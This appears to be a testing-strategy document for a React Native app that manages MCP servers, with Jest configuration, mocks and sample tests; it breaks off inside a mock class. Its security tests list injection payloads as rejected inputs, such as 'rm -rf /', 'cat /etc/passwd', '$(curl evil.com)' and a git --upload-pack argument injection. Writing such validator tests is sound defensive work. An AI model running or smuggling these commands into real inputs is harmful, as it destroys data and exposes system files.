# MCP Android Server Manager - Testing Strategy and Coverage Analysis

## Executive Summary

**Current Status**: ZERO test coverage - No test files, no testing framework configured
**Risk Level**: HIGH - Critical production code with no automated testing
**Priority**: URGENT - Requires immediate test infrastructure setup

---

## 1. Current Test Coverage Analysis

### Coverage Status: 0%

**Test Files Found**: NONE
- No `*.test.ts` or `*.spec.ts` files
- No `__tests__` directories
- No testing framework configured in package.json
- No test scripts defined

### Critical Gaps Identified

#### High-Risk Components (No Coverage)
1. **nodeBridge.ts** - IPC communication layer with timeout handling
2. **serverManager.ts** - Server lifecycle management and file operations
3. **serverStore.ts** - Zustand state management with persistence
4. **security.ts** - Input validation and sanitization (CRITICAL)
5. **schemas.ts** - Ajv JSON schema validation
6. **network.ts** - Rate limiting and retry logic
7. **tailscaleService.ts** - Network integration
8. **main.js (Node.js)** - Git operations, npm install, process spawning

#### Medium-Risk Components (No Coverage)
1. React Native screens (index.tsx, add-server.tsx, server-detail.tsx)
2. UI components (ServerCard.tsx, TailscaleCard.tsx)
3. Sentry integration (sentry.ts)
4. Theme configuration (theme.ts)

---

## 2. Recommended Test Suite Structure

### Directory Structure

```
mcpandroid/
├── src/
│   ├── __tests__/
│   │   ├── unit/
│   │   │   ├── utils/
│   │   │   │   ├── security.test.ts
│   │   │   │   ├── schemas.test.ts
│   │   │   │   └── network.test.ts
│   │   │   └── services/
│   │   │       └── tailscaleService.test.ts
│   │   ├── integration/
│   │   │   ├── nodeBridge.test.ts
│   │   │   ├── serverManager.test.ts
│   │   │   └── serverStore.test.ts
│   │   ├── e2e/
│   │   │   ├── server-lifecycle.test.ts
│   │   │   └── user-flows.test.ts
│   │   └── mocks/
│   │       ├── nodejs-mobile.mock.ts
│   │       ├── expo-modules.mock.ts
│   │       └── fixtures.ts
│   └── [existing code]
├── nodejs-assets/
│   └── nodejs-project/
│       └── __tests__/
│           ├── main.test.js
│           ├── git-operations.test.js
│           └── server-spawn.test.js
├── jest.config.js
├── jest.setup.js
└── package.json (updated)
```

---

## 3. Testing Framework Recommendations

### Primary Stack: Jest + React Native Testing Library

#### Installation

```json
{
  "devDependencies": {
    "@testing-library/react-native": "^12.4.3",
    "@testing-library/jest-native": "^5.4.3",
    "jest": "^29.7.0",
    "jest-expo": "^50.0.2",
    "@types/jest": "^29.5.11",
    "ts-jest": "^29.1.1",
    "react-test-renderer": "18.2.0"
  }
}
```

#### Jest Configuration (jest.config.js)

```javascript
module.exports = {
  preset: 'jest-expo',
  setupFilesAfterEnv: [
    '@testing-library/jest-native/extend-expect',
    '<rootDir>/jest.setup.js',
  ],
  transformIgnorePatterns: [
    'node_modules/(?!((jest-)?react-native|@react-native(-community)?)|expo(nent)?|@expo(nent)?/.*|@expo-google-fonts/.*|react-navigation|@react-navigation/.*|@unimodules/.*|unimodules|sentry-expo|native-base|react-native-svg|zustand)',
  ],
  moduleFileExtensions: ['ts', 'tsx', 'js', 'jsx'],
  collectCoverageFrom: [
    'src/**/*.{ts,tsx}',
    '!src/**/*.d.ts',
    '!src/app/_layout.tsx',
    '!src/theme.ts',
  ],
  coverageThresholds: {
    global: {
      statements: 80,
      branches: 75,
      functions: 80,
      lines: 80,
    },
  },
  testMatch: [
    '**/__tests__/**/*.[jt]s?(x)',
    '**/?(*.)+(spec|test).[jt]s?(x)',
  ],
  moduleNameMapper: {
    '^@/(.*)$': '<rootDir>/src/$1',
  },
};
```

#### Jest Setup (jest.setup.js)

```javascript
// Mock nodejs-mobile-react-native
jest.mock('nodejs-mobile-react-native', () => ({
  start: jest.fn(),
  channel: {
    addListener: jest.fn(),
    send: jest.fn(),
  },
}));

// Mock AsyncStorage
jest.mock('@react-native-async-storage/async-storage', () => ({
  setItem: jest.fn(() => Promise.resolve()),
  getItem: jest.fn(() => Promise.resolve(null)),
  removeItem: jest.fn(() => Promise.resolve()),
  clear: jest.fn(() => Promise.resolve()),
  getAllKeys: jest.fn(() => Promise.resolve([])),
}));

// Mock Expo modules
jest.mock('expo-file-system', () => ({
  documentDirectory: 'file:///mock/documents/',
  getInfoAsync: jest.fn(),
  makeDirectoryAsync: jest.fn(),
  deleteAsync: jest.fn(),
  readAsStringAsync: jest.fn(),
  writeAsStringAsync: jest.fn(),
}));

jest.mock('expo-network', () => ({
  getNetworkStateAsync: jest.fn(() =>
    Promise.resolve({
      type: 'WIFI',
      isConnected: true,
      isInternetReachable: true,
    })
  ),
  getIpAddressAsync: jest.fn(() => Promise.resolve('192.168.1.100')),
  NetworkStateType: {
    NONE: 'NONE',
    UNKNOWN: 'UNKNOWN',
    CELLULAR: 'CELLULAR',
    WIFI: 'WIFI',
    VPN: 'VPN',
  },
}));

jest.mock('expo-crypto', () => ({
  getRandomBytesAsync: jest.fn(() =>
    Promise.resolve(new Uint8Array(16).fill(0))
  ),
}));

jest.mock('expo-clipboard', () => ({
  setStringAsync: jest.fn(() => Promise.resolve()),
}));

// Mock Sentry
jest.mock('../src/utils/sentry', () => ({
  captureException: jest.fn(),
  addBreadcrumb: jest.fn(),
}));

// Suppress console errors in tests
global.console = {
  ...console,
  error: jest.fn(),
  warn: jest.fn(),
};
```

### Updated package.json Scripts

```json
{
  "scripts": {
    "start": "expo start",
    "android": "expo run:android",
    "test": "jest",
    "test:watch": "jest --watch",
    "test:coverage": "jest --coverage",
    "test:unit": "jest __tests__/unit",
    "test:integration": "jest __tests__/integration",
    "test:e2e": "jest __tests__/e2e",
    "test:ci": "jest --ci --coverage --maxWorkers=2",
    "lint": "eslint . --ext .ts,.tsx",
    "type-check": "tsc --noEmit"
  }
}
```

---

## 4. Sample Test Cases for Critical Components

### 4.1 Unit Tests: security.ts

**File**: `src/__tests__/unit/utils/security.test.ts`

```typescript
import {
  validateGitUrl,
  sanitizeServerId,
  validateBranchName,
  generateSecureId,
  validatePort,
  sanitizeEnvVar,
  validateFilePath,
} from '../../../utils/security';
import * as Crypto from 'expo-crypto';

jest.mock('expo-crypto');

describe('security.ts - Input Validation and Sanitization', () => {
  describe('validateGitUrl', () => {
    it('should accept valid GitHub HTTPS URLs', () => {
      const result = validateGitUrl('https://github.com/owner/repo');
      expect(result.valid).toBe(true);
      expect(result.sanitized).toBe('https://github.com/owner/repo.git');
    });

    it('should accept valid GitLab URLs', () => {
      const result = validateGitUrl('https://gitlab.com/owner/repo');
      expect(result.valid).toBe(true);
      expect(result.sanitized).toBe('https://gitlab.com/owner/repo.git');
    });

    it('should convert short format to full URL', () => {
      const result = validateGitUrl('owner/repo');
      expect(result.valid).toBe(true);
      expect(result.sanitized).toBe('https://github.com/owner/repo.git');
    });

    it('should reject URLs with shell metacharacters', () => {
      const dangerousUrls = [
        'https://github.com/owner/repo;rm -rf /',
        'https://github.com/owner/repo|cat /etc/passwd',
        'https://github.com/owner/repo`whoami`',
        'https://github.com/owner/repo$(curl evil.com)',
      ];

      dangerousUrls.forEach((url) => {
        const result = validateGitUrl(url);
        expect(result.valid).toBe(false);
        expect(result.error).toContain('invalid characters');
      });
    });

    it('should reject path traversal attempts', () => {
      const result = validateGitUrl('https://github.com/owner/../../../etc/passwd');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('invalid characters');
    });

    it('should reject git arguments injection', () => {
      const result = validateGitUrl('https://github.com/owner/repo --upload-pack=/tmp/evil');
      expect(result.valid).toBe(false);
    });

    it('should reject non-HTTPS protocols', () => {
      const result = validateGitUrl('git://github.com/owner/repo');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('HTTP(S)');
    });

    it('should reject untrusted hosts', () => {
      const result = validateGitUrl('https://evil.com/owner/repo');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('allowed');
    });

    it('should reject empty or invalid input', () => {
      expect(validateGitUrl('').valid).toBe(false);
      expect(validateGitUrl(null as any).valid).toBe(false);
      expect(validateGitUrl(undefined as any).valid).toBe(false);
    });
  });

  describe('sanitizeServerId', () => {
    it('should accept valid alphanumeric IDs', () => {
      expect(sanitizeServerId('abc123')).toBe('abc123');
      expect(sanitizeServerId('server-123')).toBe('server-123');
    });

    it('should remove special characters', () => {
      expect(sanitizeServerId('server@#$123')).toBe('server123');
      expect(sanitizeServerId('test/server')).toBe('testserver');
    });

    it('should throw on empty result', () => {
      expect(() => sanitizeServerId('!@#$%')).toThrow('alphanumeric');
    });

    it('should throw on too long IDs', () => {
      const longId = 'a'.repeat(100);
      expect(() => sanitizeServerId(longId)).toThrow('too long');
    });

    it('should throw on invalid input types', () => {
      expect(() => sanitizeServerId(null as any)).toThrow('Invalid');
      expect(() => sanitizeServerId(undefined as any)).toThrow('Invalid');
      expect(() => sanitizeServerId(123 as any)).toThrow('Invalid');
    });
  });

  describe('validateBranchName', () => {
    it('should accept valid branch names', () => {
      expect(validateBranchName('main').valid).toBe(true);
      expect(validateBranchName('feature/new-feature').valid).toBe(true);
      expect(validateBranchName('release-1.0').valid).toBe(true);
    });

    it('should reject invalid characters', () => {
      const invalidNames = ['branch name', 'branch~1', 'branch^', 'branch?'];
      invalidNames.forEach((name) => {
        expect(validateBranchName(name).valid).toBe(false);
      });
    });

    it('should reject path traversal', () => {
      expect(validateBranchName('feature/../main').valid).toBe(false);
    });

    it('should reject names starting with dash', () => {
      expect(validateBranchName('-main').valid).toBe(false);
    });

    it('should reject empty or too long names', () => {
      expect(validateBranchName('').valid).toBe(false);
      expect(validateBranchName('a'.repeat(300)).valid).toBe(false);
    });
  });

  describe('generateSecureId', () => {
    beforeEach(() => {
      (Crypto.getRandomBytesAsync as jest.Mock).mockResolvedValue(
        new Uint8Array([1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16])
      );
    });

    it('should generate hex string from random bytes', async () => {
      const id = await generateSecureId();
      expect(id).toBe('0102030405060708090a0b0c0d0e0f10');
      expect(id).toHaveLength(32);
    });

    it('should call crypto API with correct parameters', async () => {
      await generateSecureId();
      expect(Crypto.getRandomBytesAsync).toHaveBeenCalledWith(16);
    });
  });

  describe('validatePort', () => {
    it('should accept valid ports', () => {
      expect(validatePort(3000)).toBe(true);
      expect(validatePort(8080)).toBe(true);
      expect(validatePort(65535)).toBe(true);
    });

    it('should reject privileged ports', () => {
      expect(validatePort(80)).toBe(false);
      expect(validatePort(443)).toBe(false);
      expect(validatePort(1023)).toBe(false);
    });

    it('should reject out of range ports', () => {
      expect(validatePort(0)).toBe(false);
      expect(validatePort(70000)).toBe(false);
    });

    it('should reject non-integers', () => {
      expect(validatePort(3000.5)).toBe(false);
      expect(validatePort(NaN)).toBe(false);
    });
  });

  describe('sanitizeEnvVar', () => {
    it('should accept valid environment variables', () => {
      const result = sanitizeEnvVar('API_KEY', 'secret123');
      expect(result).toEqual({ name: 'API_KEY', value: 'secret123' });
    });

    it('should remove dangerous characters from values', () => {
      const result = sanitizeEnvVar('KEY', 'value;rm -rf /');
      expect(result?.value).not.toContain(';');
      expect(result?.value).not.toContain('rm');
    });

    it('should reject invalid variable names', () => {
      expect(sanitizeEnvVar('123ABC', 'value')).toBe(null);
      expect(sanitizeEnvVar('my-var', 'value')).toBe(null);
    });

    it('should reject protected variables', () => {
      expect(sanitizeEnvVar('PATH', '/usr/bin')).toBe(null);
      expect(sanitizeEnvVar('HOME', '/root')).toBe(null);
    });
  });

  describe('validateFilePath', () => {
    const baseDir = '/app/servers/';

    it('should accept paths within base directory', () => {
      expect(validateFilePath('/app/servers/server1/', baseDir)).toBe(true);
      expect(validateFilePath('/app/servers/test/file.txt', baseDir)).toBe(true);
    });

    it('should reject path traversal attempts', () => {
      expect(validateFilePath('/app/servers/../etc/passwd', baseDir)).toBe(false);
      expect(validateFilePath('/app/../servers/file', baseDir)).toBe(false);
    });

    it('should reject paths outside base directory', () => {
      expect(validateFilePath('/etc/passwd', baseDir)).toBe(false);
      expect(validateFilePath('/tmp/file', baseDir)).toBe(false);
    });

    it('should handle empty inputs', () => {
      expect(validateFilePath('', baseDir)).toBe(false);
      expect(validateFilePath('/app/servers/', '')).toBe(false);
    });

    it('should normalize Windows backslashes', () => {
      expect(validateFilePath('\\app\\servers\\file', '/app/servers/')).toBe(true);
    });
  });
});
```

### 4.2 Unit Tests: network.ts

**File**: `src/__tests__/unit/utils/network.test.ts`

```typescript
import {
  rateLimiter,
  checkNetworkConnectivity,
  fetchWithRetry,
  fetchGitHubAPI,
  validateResponse,
} from '../../../utils/network';
import * as Network from 'expo-network';

jest.mock('expo-network');

describe('network.ts - Rate Limiting and Network Utilities', () => {
  beforeEach(() => {
    jest.clearAllMocks();
    rateLimiter.reset('test-endpoint');
  });

  describe('RateLimiter', () => {
    beforeEach(() => {
      rateLimiter.setLimit('test', 3, 1000); // 3 requests per second
    });

    it('should allow requests within limit', async () => {
      const result1 = await rateLimiter.checkLimit('test');
      const result2 = await rateLimiter.checkLimit('test');
      const result3 = await rateLimiter.checkLimit('test');

      expect(result1.allowed).toBe(true);
      expect(result2.allowed).toBe(true);
      expect(result3.allowed).toBe(true);
    });

    it('should block requests exceeding limit', async () => {
      await rateLimiter.checkLimit('test');
      await rateLimiter.checkLimit('test');
      await rateLimiter.checkLimit('test');

      const result = await rateLimiter.checkLimit('test');
      expect(result.allowed).toBe(false);
      expect(result.retryAfter).toBeGreaterThan(0);
    });

    it('should reset after time window', async () => {
      await rateLimiter.checkLimit('test');
      await rateLimiter.checkLimit('test');
      await rateLimiter.checkLimit('test');

      // Wait for window to expire
      await new Promise((resolve) => setTimeout(resolve, 1100));

      const result = await rateLimiter.checkLimit('test');
      expect(result.allowed).toBe(true);
    });

    it('should allow unlimited requests when no limit set', async () => {
      const result = await rateLimiter.checkLimit('unlimited');
      expect(result.allowed).toBe(true);
    });
  });

  describe('checkNetworkConnectivity', () => {
    it('should return connected state', async () => {
      (Network.getNetworkStateAsync as jest.Mock).mockResolvedValue({
        type: 'WIFI',
        isConnected: true,
        isInternetReachable: true,
      });

      const result = await checkNetworkConnectivity();
      expect(result.isConnected).toBe(true);
      expect(result.type).toBe('WIFI');
    });

    it('should return disconnected state', async () => {
      (Network.getNetworkStateAsync as jest.Mock).mockResolvedValue({
        type: 'NONE',
        isConnected: false,
      });

      const result = await checkNetworkConnectivity();
      expect(result.isConnected).toBe(false);
    });

    it('should handle network check errors', async () => {
      (Network.getNetworkStateAsync as jest.Mock).mockRejectedValue(
        new Error('Network error')
      );

      const result = await checkNetworkConnectivity();
      expect(result.isConnected).toBe(false);
      expect(result.error).toBe('Network error');
    });
  });

  describe('fetchWithRetry', () => {
    beforeEach(() => {
      global.fetch = jest.fn();
    });

    it('should succeed on first attempt', async () => {
      (global.fetch as jest.Mock).mockResolvedValue({
        ok: true,
        json: async () => ({ success: true }),
      });

      const response = await fetchWithRetry('https://api.example.com/data');
      expect(response.ok).toBe(true);
      expect(global.fetch).toHaveBeenCalledTimes(1);
    });

    it('should retry on failure', async () => {
      (global.fetch as jest.Mock)
        .mockRejectedValueOnce(new Error('Network error'))
        .mockRejectedValueOnce(new Error('Network error'))
        .mockResolvedValueOnce({ ok: true });

      const response = await fetchWithRetry('https://api.example.com/data', {}, {
        retries: 3,
        retryDelay: 100,
      });

      expect(response.ok).toBe(true);
      expect(global.fetch).toHaveBeenCalledTimes(3);
    });

    it('should throw after max retries', async () => {
      (global.fetch as jest.Mock).mockRejectedValue(new Error('Network error'));

      await expect(
        fetchWithRetry('https://api.example.com/data', {}, {
          retries: 2,
          retryDelay: 50,
        })
      ).rejects.toThrow('Network error');

      expect(global.fetch).toHaveBeenCalledTimes(3); // initial + 2 retries
    });

    it('should handle timeout', async () => {
      (global.fetch as jest.Mock).mockImplementation(
        () => new Promise((resolve) => setTimeout(resolve, 2000))
      );

      await expect(
        fetchWithRetry('https://api.example.com/data', {}, {
          timeout: 100,
          retries: 0,
        })
      ).rejects.toThrow('timeout');
    });

    it('should handle 429 rate limit with retry', async () => {
      (global.fetch as jest.Mock)
        .mockResolvedValueOnce({
          ok: false,
          status: 429,
          headers: new Map([['Retry-After', '1']]),
        })
        .mockResolvedValueOnce({ ok: true });

      const response = await fetchWithRetry('https://api.example.com/data', {}, {
        retries: 2,
        retryDelay: 100,
      });

      expect(response.ok).toBe(true);
      expect(global.fetch).toHaveBeenCalledTimes(2);
    });
  });

  describe('validateResponse', () => {
    it('should parse successful JSON response', async () => {
      const mockResponse = {
        ok: true,
        json: async () => ({ data: 'test' }),
      } as Response;

      const result = await validateResponse(mockResponse);
      expect(result).toEqual({ data: 'test' });
    });

    it('should throw on HTTP error with message', async () => {
      const mockResponse = {
        ok: false,
        status: 404,
        statusText: 'Not Found',
        json: async () => ({ message: 'Resource not found' }),
      } as Response;

      await expect(validateResponse(mockResponse)).rejects.toThrow(
        'Resource not found'
      );
    });

    it('should throw on HTTP error without JSON', async () => {
      const mockResponse = {
        ok: false,
        status: 500,
        statusText: 'Internal Server Error',
        json: async () => {
          throw new Error('Not JSON');
        },
      } as Response;

      await expect(validateResponse(mockResponse)).rejects.toThrow(
        'HTTP 500: Internal Server Error'
      );
    });
  });
});
```

### 4.3 Integration Tests: nodeBridge.ts

**File**: `src/__tests__/integration/nodeBridge.test.ts`

```typescript
import nodeBridge from '../../../services/nodeBridge';
import { NodeBridgeMessage } from '../../../types';

describe('nodeBridge.ts - IPC Communication Integration', () => {
  let mockNodejs: any;

  beforeEach(() => {
    jest.clearAllMocks();
    nodeBridge.cleanup();

    mockNodejs = {
      start: jest.fn(),
      channel: {
        addListener: jest.fn(),
        send: jest.fn(),
      },
    };

    jest
      .spyOn(require('nodejs-mobile-react-native'), 'channel', 'get')
      .mockReturnValue(mockNodejs.channel);
  });

  afterEach(() => {
    nodeBridge.cleanup();
  });

  describe('initialization', () => {
    it('should initialize successfully with ready signal', async () => {
      const initPromise = nodeBridge.initialize();

      // Simulate ready message
      const messageHandler = mockNodejs.channel.addListener.mock.calls[0][1];
      messageHandler(JSON.stringify({ type: 'ready' }));

      await expect(initPromise).resolves.toBeUndefined();
      expect(nodeBridge.isInitialized()).toBe(true);
    });

    it('should timeout if ready signal not received', async () => {
      await expect(nodeBridge.initialize()).rejects.toThrow(
        'initialization timeout'
      );
    }, 20000);

    it('should not reinitialize if already initialized', async () => {
      const initPromise = nodeBridge.initialize();
      const messageHandler = mockNodejs.channel.addListener.mock.calls[0][1];
      messageHandler(JSON.stringify({ type: 'ready' }));
      await initPromise;

      await nodeBridge.initialize();
      expect(mockNodejs.start).toHaveBeenCalledTimes(1);
    });
  });

  describe('message sending', () => {
    beforeEach(async () => {
      const initPromise = nodeBridge.initialize();
      const messageHandler = mockNodejs.channel.addListener.mock.calls[0][1];
      messageHandler(JSON.stringify({ type: 'ready' }));
      await initPromise;
    });

    it('should send message and receive response', async () => {
      const message: NodeBridgeMessage = {
        type: 'status',
        serverId: 'test-server',
      };

      const sendPromise = nodeBridge.sendMessage(message);

      // Simulate response
      const messageHandler = mockNodejs.channel.addListener.mock.calls[0][1];
      const requestId = JSON.parse(mockNodejs.channel.send.mock.calls[0][0]).requestId;

      messageHandler(
        JSON.stringify({
          type: 'status',
          serverId: 'test-server',
          payload: 'running',
          requestId,
        })
      );

      const response = await sendPromise;
      expect(response.payload).toBe('running');
    });

    it('should timeout on no response', async () => {
      const message: NodeBridgeMessage = {
        type: 'status',
        serverId: 'test-server',
      };

      await expect(
        nodeBridge.sendMessage(message, 1000)
      ).rejects.toThrow('timeout');
    }, 5000);

    it('should handle error responses', async () => {
      const message: NodeBridgeMessage = {
        type: 'start',
        serverId: 'test-server',
      };

      const sendPromise = nodeBridge.sendMessage(message);

      const messageHandler = mockNodejs.channel.addListener.mock.calls[0][1];
      const requestId = JSON.parse(mockNodejs.channel.send.mock.calls[0][0]).requestId;

      messageHandler(
        JSON.stringify({
          type: 'error',
          payload: 'Server failed to start',
          requestId,
        })
      );

      await expect(sendPromise).rejects.toThrow('Server failed to start');
    });

    it('should use longer timeout for clone operations', async () => {
      const message: NodeBridgeMessage = {
        type: 'clone',
        serverId: 'test-server',
        payload: { repoUrl: 'https://github.com/test/repo' },
      };

      nodeBridge.sendMessage(message); // Don't await

      // Verify send was called
      expect(mockNodejs.channel.send).toHaveBeenCalled();
      const sentMessage = JSON.parse(mockNodejs.channel.send.mock.calls[0][0]);
      expect(sentMessage.type).toBe('clone');
    });
  });

  describe('message handlers', () => {
    it('should add and invoke message handlers', async () => {
      const handler = jest.fn();
      nodeBridge.addHandler('test-handler', handler);

      const initPromise = nodeBridge.initialize();
      const messageHandler = mockNodejs.channel.addListener.mock.calls[0][1];
      messageHandler(JSON.stringify({ type: 'ready' }));
      await initPromise;

      // Send a broadcast message
      messageHandler(JSON.stringify({ type: 'log', serverId: 'test', payload: 'message' }));

      expect(handler).toHaveBeenCalledWith({
        type: 'log',
        serverId: 'test',
        payload: 'message',
      });
    });

    it('should remove message handlers', async () => {
      const handler = jest.fn();
      nodeBridge.addHandler('test-handler', handler);
      nodeBridge.removeHandler('test-handler');

      const initPromise = nodeBridge.initialize();
      const messageHandler = mockNodejs.channel.addListener.mock.calls[0][1];
      messageHandler(JSON.stringify({ type: 'ready' }));
      await initPromise;

      messageHandler(JSON.stringify({ type: 'log', payload: 'message' }));
      expect(handler).not.toHaveBeenCalled();
    });

    it('should limit number of handlers to prevent memory leak', () => {
      for (let i = 0; i < 150; i++) {
        nodeBridge.addHandler(`handler-${i}`, jest.fn());
      }

      const stats = nodeBridge.getStats();
      expect(stats.handlers).toBeLessThanOrEqual(100);
    });
  });

  describe('cleanup', () => {
    it('should cancel pending requests', async () => {
      const initPromise = nodeBridge.initialize();
      const messageHandler = mockNodejs.channel.addListener.mock.calls[0][1];
      messageHandler(JSON.stringify({ type: 'ready' }));
      await initPromise;

      const sendPromise = nodeBridge.sendMessage({ type: 'status', serverId: 'test' });

      nodeBridge.cleanup();

      await expect(sendPromise).rejects.toThrow('cleanup');
    });

    it('should clear all handlers', () => {
      nodeBridge.addHandler('test1', jest.fn());
      nodeBridge.addHandler('test2', jest.fn());

      nodeBridge.cleanup();

      const stats = nodeBridge.getStats();
      expect(stats.handlers).toBe(0);
      expect(stats.initialized).toBe(false);
    });
  });

  describe('statistics', () => {
    it('should track pending requests', async () => {
      const initPromise = nodeBridge.initialize();
      const messageHandler = mockNodejs.channel.addListener.mock.calls[0][1];
      messageHandler(JSON.stringify({ type: 'ready' }));
      await initPromise;

      nodeBridge.sendMessage({ type: 'status', serverId: 'test' });

      const stats = nodeBridge.getStats();
      expect(stats.pendingRequests).toBe(1);
    });
  });
});
```

### 4.4 Integration Tests: serverStore.ts

**File**: `src/__tests__/integration/serverStore.test.ts`

```typescript
import { renderHook, act, waitFor } from '@testing-library/react-native';
import { useServerStore } from '../../../stores/serverStore';
import { serverManager } from '../../../services/serverManager';
import AsyncStorage from '@react-native-async-storage/async-storage';

jest.mock('../../../services/serverManager');

describe('serverStore.ts - Zustand State Management', () => {
  beforeEach(async () => {
    await AsyncStorage.clear();
    useServerStore.setState({ servers: [], selectedServerId: null });
    jest.clearAllMocks();
  });

  describe('addServer', () => {
    it('should add a new server', async () => {
      (serverManager.cloneRepo as jest.Mock).mockResolvedValue(undefined);

      const { result } = renderHook(() => useServerStore());

      await act(async () => {
        await result.current.addServer({
          name: 'test-server',
          description: 'A test server',
          url: 'https://github.com/test/server',
          defaultBranch: 'main',
          stars: 100,
          language: 'TypeScript',
          fullName: 'test/server',
        });
      });

      expect(result.current.servers).toHaveLength(1);
      expect(result.current.servers[0].name).toBe('test-server');
      expect(result.current.servers[0].status).toBe('stopped');
    });

    it('should handle clone errors', async () => {
      (serverManager.cloneRepo as jest.Mock).mockRejectedValue(
        new Error('Clone failed')
      );

      const { result } = renderHook(() => useServerStore());

      await act(async () => {
        await expect(
          result.current.addServer({
            name: 'test-server',
            description: 'Test',
            url: 'https://github.com/test/server',
            defaultBranch: 'main',
            stars: 0,
            language: 'JS',
            fullName: 'test/server',
          })
        ).rejects.toThrow('Clone failed');
      });

      expect(result.current.servers).toHaveLength(0);
      expect(result.current.error).toBe('Clone failed');
    });

    it('should assign incremental ports', async () => {
      (serverManager.cloneRepo as jest.Mock).mockResolvedValue(undefined);

      const { result } = renderHook(() => useServerStore());

      await act(async () => {
        await result.current.addServer({
          name: 'server1',
          description: 'Test',
          url: 'https://github.com/test/server1',
          defaultBranch: 'main',
          stars: 0,
          language: 'JS',
          fullName: 'test/server1',
        });

        await result.current.addServer({
          name: 'server2',
          description: 'Test',
          url: 'https://github.com/test/server2',
          defaultBranch: 'main',
          stars: 0,
          language: 'JS',
          fullName: 'test/server2',
        });
      });

      expect(result.current.servers[0].port).toBe(3000);
      expect(result.current.servers[1].port).toBe(3001);
    });
  });

  describe('startServer', () => {
    beforeEach(async () => {
      const { result } = renderHook(() => useServerStore());
      (serverManager.cloneRepo as jest.Mock).mockResolvedValue(undefined);

      await act(async () => {
        await result.current.addServer({
          name: 'test-server',
          description: 'Test',
          url: 'https://github.com/test/server',
          defaultBranch: 'main',
          stars: 0,
          language: 'JS',
          fullName: 'test/server',
        });
      });
    });

    it('should start a server successfully', async () => {
      (serverManager.startServer as jest.Mock).mockResolvedValue(undefined);

      const { result } = renderHook(() => useServerStore());
      const serverId = result.current.servers[0].id;

      await act(async () => {
        await result.current.startServer(serverId);
      });

      expect(result.current.servers[0].status).toBe('running');
      expect(result.current.servers[0].lastStarted).toBeDefined();
    });

    it('should prevent starting an already running server', async () => {
      (serverManager.startServer as jest.Mock).mockResolvedValue(undefined);

      const { result } = renderHook(() => useServerStore());
      const serverId = result.current.servers[0].id;

      await act(async () => {
        await result.current.startServer(serverId);
      });

      await act(async () => {
        await expect(result.current.startServer(serverId)).rejects.toThrow(
          'already running'
        );
      });
    });

    it('should handle start errors', async () => {
      (serverManager.startServer as jest.Mock).mockRejectedValue(
        new Error('Port in use')
      );

      const { result } = renderHook(() => useServerStore());
      const serverId = result.current.servers[0].id;

      await act(async () => {
        await expect(result.current.startServer(serverId)).rejects.toThrow(
          'Port in use'
        );
      });

      expect(result.current.servers[0].status).toBe('error');
      expect(result.current.servers[0].errorMessage).toBe('Port in use');
    });
  });

  describe('stopServer', () => {
    it('should stop a running server', async () => {
      (serverManager.startServer as jest.Mock).mockResolvedValue(undefined);
      (serverManager.stopServer as jest.Mock).mockResolvedValue(undefined);
      (serverManager.cloneRepo as jest.Mock).mockResolvedValue(undefined);

      const { result } = renderHook(() => useServerStore());

      await act(async () => {
        await result.current.addServer({
          name: 'test-server',
          description: 'Test',
          url: 'https://github.com/test/server',
          defaultBranch: 'main',
          stars: 0,
          language: 'JS',
          fullName: 'test/server',
        });
      });

      const serverId = result.current.servers[0].id;

      await act(async () => {
        await result.current.startServer(serverId);
        await result.current.stopServer(serverId);
      });

      expect(result.current.servers[0].status).toBe('stopped');
    });

    it('should handle already stopped servers gracefully', async () => {
      (serverManager.cloneRepo as jest.Mock).mockResolvedValue(undefined);

      const { result } = renderHook(() => useServerStore());

      await act(async () => {
        await result.current.addServer({
          name: 'test-server',
          description: 'Test',
          url: 'https://github.com/test/server',
          defaultBranch: 'main',
          stars: 0,
          language: 'JS',
          fullName: 'test/server',
        });
      });

      const serverId = result.current.servers[0].id;

      await act(async () => {
        await result.current.stopServer(serverId);
      });

      expect(result.current.servers[0].status).toBe('stopped');
    });
  });

  describe('removeServer', () => {
    it('should remove a server', async () => {
      (serverManager.cloneRepo as jest.Mock).mockResolvedValue(undefined);
      (serverManager.deleteServer as jest.Mock).mockResolvedValue(undefined);

      const { result } = renderHook(() => useServerStore());

      await act(async () => {
        await result.current.addServer({
          name: 'test-server',
          description: 'Test',
          url: 'https://github.com/test/server',
          defaultBranch: 'main',
          stars: 0,
          language: 'JS',
          fullName: 'test/server',
        });
      });

      const serverId = result.current.servers[0].id;

      await act(async () => {
        await result.current.removeServer(serverId);
      });

      expect(result.current.servers).toHaveLength(0);
    });

    it('should stop server before removing if running', async () => {
      (serverManager.cloneRepo as jest.Mock).mockResolvedValue(undefined);
      (serverManager.startServer as jest.Mock).mockResolvedValue(undefined);
      (serverManager.stopServer as jest.Mock).mockResolvedValue(undefined);
      (serverManager.deleteServer as jest.Mock).mockResolvedValue(undefined);

      const { result } = renderHook(() => useServerStore());

      await act(async () => {
        await result.current.addServer({
          name: 'test-server',
          description: 'Test',
          url: 'https://github.com/test/server',
          defaultBranch: 'main',
          stars: 0,
          language: 'JS',
          fullName: 'test/server',
        });
      });

      const serverId = result.current.servers[0].id;

      await act(async () => {
        await result.current.startServer(serverId);
        await result.current.removeServer(serverId);
      });

      expect(serverManager.stopServer).toHaveBeenCalled();
      expect(result.current.servers).toHaveLength(0);
    });
  });

  describe('persistence', () => {
    it('should persist servers to AsyncStorage', async () => {
      (serverManager.cloneRepo as jest.Mock).mockResolvedValue(undefined);

      const { result } = renderHook(() => useServerStore());

      await act(async () => {
        await result.current.addServer({
          name: 'test-server',
          description: 'Test',
          url: 'https://github.com/test/server',
          defaultBranch: 'main',
          stars: 0,
          language: 'JS',
          fullName: 'test/server',
        });
      });

      await waitFor(() => {
        expect(AsyncStorage.setItem).toHaveBeenCalled();
      });
    });

    it('should reset server status on app restart', async () => {
      // Simulate persisted data with running server
      const mockData = {
        state: {
          servers: [
            {
              id: 'test-123',
              name: 'test-server',
              status: 'running', // This should be reset to 'stopped'
              port: 3000,
            },
          ],
        },
      };

      (AsyncStorage.getItem as jest.Mock).mockResolvedValue(
        JSON.stringify(mockData)
      );

      // Re-create store to trigger persistence rehydration
      const { result } = renderHook(() => useServerStore());

      await waitFor(() => {
        expect(result.current.servers[0]?.status).toBe('stopped');
      });
    });
  });
});
```

---

## 5. Mock Strategies and Fixtures

### 5.1 nodejs-mobile Mock

**File**: `src/__tests__/mocks/nodejs-mobile.mock.ts`

```typescript
export class MockNodeJS {
  private messageListeners: Array<(msg: string) => void> = [];
  private started = false;

